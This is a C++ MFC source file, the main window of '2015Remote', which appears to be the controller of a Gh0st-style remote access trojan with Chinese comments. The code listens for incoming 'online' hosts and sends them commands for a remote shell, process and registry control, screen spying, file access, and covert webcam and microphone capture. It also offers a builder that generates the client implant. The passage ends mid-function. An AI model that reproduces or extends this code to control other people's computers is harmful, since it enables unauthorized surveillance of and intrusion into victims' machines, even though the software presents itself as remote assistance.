
// 2015RemoteDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "2015RemoteDlg.h"
#include "afxdialogex.h"
#include "SettingDlg.h"
#include "IOCPServer.h"
#include "ScreenSpyDlg.h"
#include "FileManagerDlg.h"
#include "TalkDlg.h"
#include "ShellDlg.h"
#include "SystemDlg.h"
#include "BuildDlg.h"
#include "AudioDlg.h"
#include "RegisterDlg.h"
#include "ServicesDlg.h"
#include "VideoDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define UM_ICONNOTIFY WM_USER+100
enum
{
	ONLINELIST_IP=0,          //IP的列顺序
	ONLINELIST_ADDR,          //地址
	ONLINELIST_COMPUTER_NAME, //计算机名/备注
	ONLINELIST_OS,            //操作系统
	ONLINELIST_CPU,           //CPU
	ONLINELIST_VIDEO,         //摄像头(有无)
	ONLINELIST_PING           //PING(对方的网速)
};


typedef struct
{
	char*   szTitle;           //列表的名称
	int		nWidth;            //列表的宽度
}COLUMNSTRUCT;


COLUMNSTRUCT g_Column_Data_Online[] = 
{
	{"IP",			148	},
	{"区域",			150	},
	{"计算机名/备注",	160	},
	{"操作系统",		128	},
	{"CPU",			80	},
	{"摄像头",		81	},
	{"PING",			151	}
};

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框
int  g_Column_Count_Online  = 7;



COLUMNSTRUCT g_Column_Data_Message[] = 
{
	{"信息类型",		200	},
	{"时间",			200	},
	{"信息内容",	    490	}
};

int g_Column_Count_Message = 3;   //列表的个数


int g_Column_Online_Width  = 0; 
int g_Column_Message_Width = 0; 
IOCPServer *m_iocpServer   = NULL;  
CMy2015RemoteDlg*  g_2015RemoteDlg = NULL;

static UINT Indicators[] =
{
	IDR_STATUSBAR_STRING  
};

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CMy2015RemoteDlg 对话框




CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CMy2015RemoteDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);



	m_bmOnline[0].LoadBitmap(IDB_BITMAP_ONLINE);
	m_bmOnline[1].LoadBitmap(IDB_BITMAP_ONLINE);

	m_iCount = 0;

}

void CMy2015RemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_WM_TIMER()
	ON_WM_CLOSE()
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CMy2015RemoteDlg::OnNMRClickOnline)
	ON_COMMAND(ID_ONLINE_MESSAGE, &CMy2015RemoteDlg::OnOnlineMessage)
	ON_COMMAND(ID_ONLINE_DELETE, &CMy2015RemoteDlg::OnOnlineDelete)
	ON_COMMAND(IDM_ONLINE_ABOUT,&CMy2015RemoteDlg::OnAbout)

	ON_COMMAND(IDM_ONLINE_CMD, &CMy2015RemoteDlg::OnOnlineCmdManager)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CMy2015RemoteDlg::OnOnlineProcessManager)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CMy2015RemoteDlg::OnOnlineWindowManager)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CMy2015RemoteDlg::OnOnlineDesktopManager)
	ON_COMMAND(IDM_ONLINE_FILE, &CMy2015RemoteDlg::OnOnlineFileManager)
	ON_COMMAND(IDM_ONLINE_AUDIO, &CMy2015RemoteDlg::OnOnlineAudioManager)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CMy2015RemoteDlg::OnOnlineVideoManager)
	ON_COMMAND(IDM_ONLINE_SERVER, &CMy2015RemoteDlg::OnOnlineServerManager)
	ON_COMMAND(IDM_ONLINE_REGISTER, &CMy2015RemoteDlg::OnOnlineRegisterManager)  
	ON_COMMAND(IDM_ONLINE_BUILD, &CMy2015RemoteDlg::OnOnlineBuildClient)    //生成Client
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify) 
	ON_COMMAND(IDM_NOTIFY_SHOW, &CMy2015RemoteDlg::OnNotifyShow)
	ON_COMMAND(ID_NOTIFY_EXIT, &CMy2015RemoteDlg::OnNotifyExit)
	ON_COMMAND(ID_MAIN_SET, &CMy2015RemoteDlg::OnMainSet)
	ON_COMMAND(ID_MAIN_EXIT, &CMy2015RemoteDlg::OnMainExit)
	ON_MESSAGE(WM_USERTOONLINELIST, OnUserToOnlineList) 
	
	
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog) 
	ON_MESSAGE(WM_OPENFILEMANAGERDIALOG, OnOpenFileManagerDialog)
	ON_MESSAGE(WM_OPENTALKDIALOG, OnOpenTalkDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENSYSTEMDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENSERVICESDIALOG, OnOpenServicesDialog)
	ON_MESSAGE(WM_OPENREGISTERDIALOG, OnOpenRegisterDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenVideoDialog)
END_MESSAGE_MAP()


// CMy2015RemoteDlg 消息处理程序
void CMy2015RemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)   
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN: 
	case WM_LBUTTONDBLCLK: 
		{
			if (!IsWindowVisible())
			{
				ShowWindow(SW_SHOW);
			}
			else
			{
				ShowWindow(SW_HIDE);
			}
			break;
		}
	
	case WM_RBUTTONDOWN:
		{
			CMenu Menu;
			Menu.LoadMenu(IDR_MENU_NOTIFY);
			CPoint Point;
			GetCursorPos(&Point);
			SetForegroundWindow();   //设置当前窗口
			Menu.GetSubMenu(0)->TrackPopupMenu(
				TPM_LEFTBUTTON|TPM_RIGHTBUTTON, 
				Point.x, Point.y, this, NULL); 
		
			break;
		}
		
	}
}

VOID CMy2015RemoteDlg::CreateSolidMenu()
{

	HMENU hMenu;   //SDK  C   MFC  C++
	hMenu = LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU_MAIN));   //载入菜单资源
	::SetMenu(this->GetSafeHwnd(),hMenu);                    //为窗口设置菜单
	::DrawMenuBar(this->GetSafeHwnd());                      //显示菜单

}



VOID CMy2015RemoteDlg::CreatStatusBar()
{
	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(Indicators,
		sizeof(Indicators)/sizeof(UINT)))                    //创建状态条并设置字符资源的ID
	{
		return ;      
	}

	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;
	MoveWindow(rect);
}

VOID CMy2015RemoteDlg::CreateNotifyBar()
{


	m_Nid.cbSize = sizeof(NOTIFYICONDATA);     //大小赋值
	m_Nid.hWnd = m_hWnd;           //父窗口    是被定义在父类CWnd类中
	m_Nid.uID = IDR_MAINFRAME;     //icon  ID
	m_Nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;     //托盘所拥有的状态
	m_Nid.uCallbackMessage = UM_ICONNOTIFY;              //回调消息
	m_Nid.hIcon = m_hIcon;                               //icon 变量
	CString strTips ="2015Remote远程协助软件.........";       //气泡提示
	lstrcpyn(m_Nid.szTip, (LPCSTR)strTips, sizeof(m_Nid.szTip) / sizeof(m_Nid.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &m_Nid);   //显示托盘

}

VOID CMy2015RemoteDlg::CreateToolBar()
{
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))  //创建一个工具条  加载资源
	{

		return;     
	}
	m_ToolBar.LoadTrueColorToolBar
		(
		48,    //加载真彩工具条
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN
		);  //和我们的位图资源相关联
	RECT Rect,RectMain;
	GetWindowRect(&RectMain);   //得到整个窗口的大小
	Rect.left=0;
	Rect.top=0;
	Rect.bottom=80;
	Rect.right=RectMain.right-RectMain.left+10;
	m_ToolBar.MoveWindow(&Rect,TRUE);



	


	m_ToolBar.SetButtonText(0,"终端管理");     //在位图的下面添加文件
	m_ToolBar.SetButtonText(1,"进程管理"); 
	m_ToolBar.SetButtonText(2,"窗口管理"); 
	m_ToolBar.SetButtonText(3,"桌面管理"); 
	m_ToolBar.SetButtonText(4,"文件管理"); 
	m_ToolBar.SetButtonText(5,"语音管理"); 
	m_ToolBar.SetButtonText(6,"视频管理"); 
	m_ToolBar.SetButtonText(7,"服务管理"); 
	m_ToolBar.SetButtonText(8,"注册表管理"); 
	m_ToolBar.SetButtonText(9,"参数设置"); 
	m_ToolBar.SetButtonText(10,"生成服务端"); 
	m_ToolBar.SetButtonText(11,"帮助"); 
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //显示
}


VOID CMy2015RemoteDlg::InitControl()
{
	
	/*
		SendMessage(synchronization)  PostMessage(asynchronization)

		//专属函数
	*/

	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;
	MoveWindow(rect);


/*	m_CList_Online.InsertColumn(0, "姓名", LVCFMT_LEFT, 100);   
	m_CList_Online.InsertColumn(1, "家庭住址", LVCFMT_LEFT, 100);
	m_CList_Online.InsertColumn(2, "电话号码", LVCFMT_LEFT, 100);*/



	for (int i = 0;i<g_Column_Count_Online;i++)
	{
		m_CList_Online.InsertColumn(i, g_Column_Data_Online[i].szTitle,LVCFMT_CENTER,g_Column_Data_Online[i].nWidth);


		g_Column_Online_Width+=g_Column_Data_Online[i].nWidth; 
	

	}
	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);


	for (int i = 0; i < g_Column_Count_Message; i++)
	{
		m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].szTitle,LVCFMT_CENTER,g_Column_Data_Message[i].nWidth);

			
		g_Column_Message_Width+=g_Column_Data_Message[i].nWidth;  
	}

	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	SetTimer(0,3000,NULL);
}


VOID CMy2015RemoteDlg::TestOnline()
{
//	AddList("1","本机局域网","中国","Windows7","2.2GHZ","有","1000");
//	AddList("2","本机局域网","日本","Windows7","2.2GHZ","有","1000");
//	AddList("3","本机局域网","美国","Windows7","2.2GHZ","有","1000");
	ShowMessage(true,"软件初始化成功...");
}


VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing,CONTEXT_OBJECT* ContextObject)
{
			
	
	//默认为0行  这样所有插入的新列都在最上面
	
	 int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(),strIP);

	m_CList_Online.SetItemText(i,ONLINELIST_ADDR,strAddr);      
	m_CList_Online.SetItemText(i,ONLINELIST_COMPUTER_NAME,strPCName); 
	m_CList_Online.SetItemText(i,ONLINELIST_OS,strOS); 
	m_CList_Online.SetItemText(i,ONLINELIST_CPU,strCPU);
	m_CList_Online.SetItemText(i,ONLINELIST_VIDEO,strVideo);
	m_CList_Online.SetItemText(i,ONLINELIST_PING,strPing); 

	m_CList_Online.SetItemData(i,(DWORD_PTR)ContextObject);
	ShowMessage(true,strIP+"主机上线"); 
}


VOID CMy2015RemoteDlg::ShowMessage(BOOL bOk, CString strMsg)
{
	CString strIsOK,strTime;
	CTime Timer =CTime::GetCurrentTime();          //定义一个CTime 类的一个对象 t 使用类中的成员函数GetCurrentTime() 而不是 SDK函数
	strTime= Timer.Format("%H:%M:%S");
	if (bOk)
	{
		strIsOK="执行成功";
	}
	else
	{
		strIsOK="执行失败";
	}
	m_CList_Message.InsertItem(0,strIsOK);    //向控件中设置数据
	m_CList_Message.SetItemText(0,1,strTime);
	m_CList_Message.SetItemText(0,2,strMsg);


	CString strStatusMsg;
	if (strMsg.Find("上线")>0)         //处理上线还是下线消息
	{
		m_iCount++;
	}else if (strMsg.Find("下线")>0)
	{
		m_iCount--;
	}else if (strMsg.Find("断开")>0)
	{
		m_iCount--;
	}

	m_iCount=(m_iCount<=0?0:m_iCount);         //防止iCount 有-1的情况


	strStatusMsg.Format("有%d个主机在线",m_iCount);
	m_StatusBar.SetPaneText(0,strStatusMsg);   //在状态条上显示文字



}

BOOL CMy2015RemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	g_2015RemoteDlg = this;
	CreateToolBar();
	InitControl();

	CreatStatusBar();

//	TestOnline();

	CreateNotifyBar();

	CreateSolidMenu();

	ListenPort();


//	SetTimer(1,8000,NULL);

	
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}



void CMy2015RemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CMy2015RemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CMy2015RemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	if (SIZE_MINIMIZED==nType)
	{
		return;
	} 
	if (m_CList_Online.m_hWnd!=NULL)   //（控件也是窗口因此也有句柄）
	{
		CRect rc;
		rc.left = 1;          //列表的左坐标     
		rc.top  = 80;         //列表的上坐标
		rc.right  =  cx-1;    //列表的右坐标
		rc.bottom = cy-160;   //列表的下坐标
		m_CList_Online.MoveWindow(rc);


		for(int i=0;i<g_Column_Count_Online;i++){           //遍历每一个列
			double Temp=g_Column_Data_Online[i].nWidth;     //得到当前列的宽度   138
			Temp/=g_Column_Online_Width;                    //看一看当前宽度占总长度的几分之几
			Temp*=cx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth = Temp;                               //转换为int 类型
			m_CList_Online.SetColumnWidth(i,(lenth));       //设置当前的宽度
		}
	}


	if (m_CList_Message.m_hWnd!=NULL)
	{
		CRect rc;
		rc.left = 1;         //列表的左坐标
		rc.top = cy-156;     //列表的上坐标
		rc.right  = cx-1;    //列表的右坐标
		rc.bottom = cy-20;   //列表的下坐标
		m_CList_Message.MoveWindow(rc);
		for(int i=0;i<g_Column_Count_Message;i++){           //遍历每一个列
			double Temp=g_Column_Data_Message[i].nWidth;     //得到当前列的宽度
			Temp/=g_Column_Message_Width;                    //看一看当前宽度占总长度的几分之几
			Temp*=cx;                                        //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth=Temp;                                  //转换为int 类型
			m_CList_Message.SetColumnWidth(i,(lenth));        //设置当前的宽度
		}
	}

	if(m_StatusBar.m_hWnd!=NULL){    //当对话框大小改变时 状态条大小也随之改变
		CRect Rect;
		Rect.top=cy-20;
		Rect.left=0;
		Rect.right=cx;
		Rect.bottom=cy;
		m_StatusBar.MoveWindow(Rect);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0),SBPS_POPOUT, cx-10);
	}


	if(m_ToolBar.m_hWnd!=NULL)                  //工具条
	{
		CRect rc;
		rc.top=rc.left=0;
		rc.right=cx;
		rc.bottom=80;
		m_ToolBar.MoveWindow(rc);             //设置工具条大小位置
	}

}


void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	switch(nIDEvent)
	{

	case 0:
		{
	//		MessageBox("0","0");
			break;
		}

	case 1:
		{

//			MessageBox("1","1");
			break;
		}
	}

	//MessageBox("1","1");

	/*static  int i = 0;

	i++;

	CString  strTips;
	strTips.Format("%d",i);

	SetWindowText(strTips.GetBuffer(0));
	UpdateData(FALSE);
	CDialogEx::OnTimer(nIDEvent);*/
}


void CMy2015RemoteDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	KillTimer(0);
	if (::MessageBox(NULL,"你确定?","2015Remote",MB_OKCANCEL)==1)
	{
		Shell_NotifyIcon(NIM_DELETE, &m_Nid);


		if (m_iocpServer!=NULL)
		{
			delete m_iocpServer;
			m_iocpServer = NULL;
		}
		CDialogEx::OnClose();
	}
	else
	{

	}
}


void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	
	//弹出菜单

	CMenu	Menu;
	Menu.LoadMenu(IDR_MENU_LIST_ONLINE);               //加载菜单资源   资源和类对象关联
	
	CMenu*	SubMenu = Menu.GetSubMenu(0);    

	
	CPoint	Point;    
	GetCursorPos(&Point);


	int	iCount = SubMenu->GetMenuItemCount();
	if (m_CList_Online.GetSelectedCount() == 0)         //如果没有选中
	{ 
		for (int i = 0;i<iCount;i++)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
		}

	}

	Menu.SetMenuItemBitmaps(ID_ONLINE_MESSAGE, MF_BYCOMMAND, &m_bmOnline[0], &m_bmOnline[0]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_DELETE, MF_BYCOMMAND, &m_bmOnline[1], &m_bmOnline[1]);
	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);


	*pResult = 0;
}


void CMy2015RemoteDlg::OnOnlineMessage()
{
	BYTE bToken = COMMAND_TALK;   //向被控端发送一个COMMAND_SYSTEM
	SendSelectedCommand(&bToken, sizeof(BYTE));
}


void CMy2015RemoteDlg::OnOnlineDelete()
{
	// TODO: 在此添加命令处理程序代码
	

	BYTE bToken = COMMAND_BYE;   //向被控端发送一个COMMAND_SYSTEM
	SendSelectedCommand(&bToken, sizeof(BYTE));   //Context     PreSending   PostSending

	CString  strIP;
	int iCount = m_CList_Online.GetSelectedCount();
	int i = 0;


	for (i=0;i<iCount;i++)
	{
		POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
		int iItem = m_CList_Online.GetNextSelectedItem(Pos);
		strIP = m_CList_Online.GetItemText(iItem,ONLINELIST_IP);  
		m_CList_Online.DeleteItem(iItem);
		strIP+="断开连接";
		ShowMessage(true,strIP);
	}



/*	
	int iItem = m_CList_Online.GetSelectionMark();

	if (iItem<0)
	{
		return;
	}

	strIP = m_CList_Online.GetItemText(iItem,ONLINELIST_IP);  

	m_CList_Online.DeleteItem(iItem);

	strIP+="断开连接";
	ShowMessage(true,strIP); */   	
}

VOID CMy2015RemoteDlg::OnOnlineCmdManager()
{
	BYTE	bToken = COMMAND_SHELL;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}


VOID CMy2015RemoteDlg::OnOnlineProcessManager()
{
	BYTE	bToken = COMMAND_SYSTEM;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}



VOID CMy2015RemoteDlg::OnOnlineWindowManager()
{
	BYTE	bToken = COMMAND_WSLIST;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}


VOID CMy2015RemoteDlg::OnOnlineDesktopManager()
{	
	BYTE	bToken = COMMAND_SCREEN_SPY;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineFileManager()
{
//	MessageBox("1","1");


	BYTE	bToken = COMMAND_LIST_DRIVE;  //磁盘卷驱动设备      
	//向被控端发送消息COMMAND_LIST_DRIVE 在被控端中搜索COMMAND_LIST_DRIVE

	SendSelectedCommand(&bToken, sizeof(BYTE));

}
VOID CMy2015RemoteDlg::OnOnlineAudioManager()
{
	BYTE	bToken = COMMAND_AUDIO;                 //向被控端发送命令
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineVideoManager()
{

	BYTE	bToken = COMMAND_WEBCAM;                 //向被控端发送命令
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineServerManager()
{
	BYTE	bToken = COMMAND_SERVICES;         //赋值一个宏 然后发送到服务端，到服务端搜索COMMAND_SYSTEM
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineRegisterManager()
{
	BYTE	bToken = COMMAND_REGEDIT;         
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

void CMy2015RemoteDlg::OnOnlineBuildClient()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("生成服务端");
	CBuildDlg Dlg;
	Dlg.DoModal();
}


VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
{

	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();   //1[pcontext client]  2  3   //1    2
	while(Pos) 
	{
		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);      
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem); //从列表条目中取出ClientContext结构体


		// 发送获得驱动器列表数据包                                                 //查看ClientContext结构体
		m_iocpServer->OnClientPreSending(ContextObject,szBuffer, ulLength);         //Cleint   Context

	} 
}




//真彩Bar
VOID CMy2015RemoteDlg::OnAbout()
{
	MessageBox("1","1");

	m_ToolBar.SetButtonText(0,"Terminal");     //在位图的下面添加文件
}

//托盘Menu
void CMy2015RemoteDlg::OnNotifyShow()
{
	// TODO: 在此添加命令处理程序代码
	ShowWindow(SW_SHOW);
}


void CMy2015RemoteDlg::OnNotifyExit()
{
	// TODO: 在此添加命令处理程序代码

	SendMessage(WM_CLOSE);
}




//固态菜单
void CMy2015RemoteDlg::OnMainSet()
{
	CSettingDlg  Dlg;

	Dlg.DoModal();   //模态 阻塞
}


void CMy2015RemoteDlg::OnMainExit()
{
	// TODO: 在此添加命令处理程序代码
	SendMessage(WM_CLOSE);
}




VOID CMy2015RemoteDlg::ListenPort()
{
	int nPort = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("Settings", "ListenPort");         
	//读取ini 文件中的监听端口
	int nMaxConnection = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("Settings", "MaxConnection");    
	//读取最大连接数
	if (nPort == 0)
		nPort = 2356;
	if (nMaxConnection == 0)
		nMaxConnection = 10000;
	Activate(nPort,nMaxConnection);             //开始监听
}


VOID CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection)
{

	m_iocpServer = new IOCPServer;                //动态申请我们的类对象

	if (m_iocpServer==NULL)
	{
		return;
	}


	if (m_iocpServer->StartServer(NotifyProc,nPort)==TRUE)
	{
	}




	CString strTemp;
	strTemp.Format("监听端口: %d成功", nPort);
	ShowMessage(true,strTemp);
}




VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
{
	
		
	MessageHandle(ContextObject);
	
	
	

}
	

VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject) 
{

	if (ContextObject == NULL)
	{
		return;  //int 宏 intDlgHwnd
	}


	if (ContextObject->v1 > 0)
	{
		

		switch(ContextObject->v1)
		{
		case VIDEO_DLG:
			{


				CVideoDlg *Dlg = (CVideoDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
		case SERVICES_DLG:
			{
				CServicesDlg *Dlg = (CServicesDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
		case AUDIO_DLG:
			{
				CAudioDlg *Dlg = (CAudioDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
		case SYSTEM_DLG:
			{
				CSystemDlg *Dlg = (CSystemDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
		case SHELL_DLG:
			{
				CShellDlg *Dlg = (CShellDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();

				break;
			}
		case SCREENSPY_DLG:
			{
				CScreenSpyDlg *Dlg = (CScreenSpyDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
		case FILEMANAGER_DLG:
			{
				CFileManagerDlg *Dlg = (CFileManagerDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
		case REGISTER_DLG:
			{
				CRegisterDlg *Dlg = (CRegisterDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}

		
		}
		return;
	}

	switch (ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
	{
	case COMMAND_BYE:
		{
			CancelIo((HANDLE)ContextObject->sClientSocket);
			closesocket(ContextObject->sClientSocket); 
			Sleep(10);

			break;
		}
	case TOKEN_LOGIN: // 上线包  shine
		{
			//这里处理上线
		//	if (m_iocpServer->m_nMaxConnections <= g_ControlServerDlg->m_CList_Online.GetItemCount())    
		//	{
		//		closesocket(pContext->m_Socket); 
		//	}
		//	else
			{
			//	pContext->m_bIsMainSocket = true;    //上线   AddTail
				g_2015RemoteDlg->PostMessage(WM_USERTOONLINELIST, 0, (LPARAM)ContextObject);      //向窗口投递用户上线的消息 


			//	BYTE	bToken = COMMAND_ACTIVED;
			//	m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));   //shine       
			}

			break;
		}

	case TOKEN_BITMAPINFO:
		{


			g_2015RemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)ContextObject);   
			break;
		}
	case TOKEN_DRIVE_LIST:
		{


			g_2015RemoteDlg->PostMessage(WM_OPENFILEMANAGERDIALOG, 0, (LPARAM)ContextObject);   
			break;
		}

	case TOKEN_TALK_START:
		{

			g_2015RemoteDlg->PostMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);   
			break;
		}

	case TOKEN_SHELL_START:
		{

			g_2015RemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);   
			break;
		}
	case TOKEN_WSLIST:  //wndlist
	case TOKEN_PSLIST:  //processlist
		{

			g_2015RemoteDlg->PostMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)ContextObject);      //打开进程枚举的对话框

			break;
		}

	case TOKEN_AUDIO_START:
		{
			
			g_2015RemoteDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)ContextObject);  
			break;
		}

	case TOKEN_REGEDIT:
		{                            
			g_2015RemoteDlg->PostMessage(WM_OPENREGISTERDIALOG, 0, (LPARAM)ContextObject);  
			break;
		}

	case TOKEN_SERVERLIST:
		{

			g_2015RemoteDlg->PostMessage(WM_OPENSERVICESDIALOG, 0, (LPARAM)ContextObject);
			break;
		}

	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		{
			g_2015RemoteDlg->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	}
}



LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
{
	CString strIP,  strAddr,  strPCName, strOS, strCPU, strVideo, strPing;
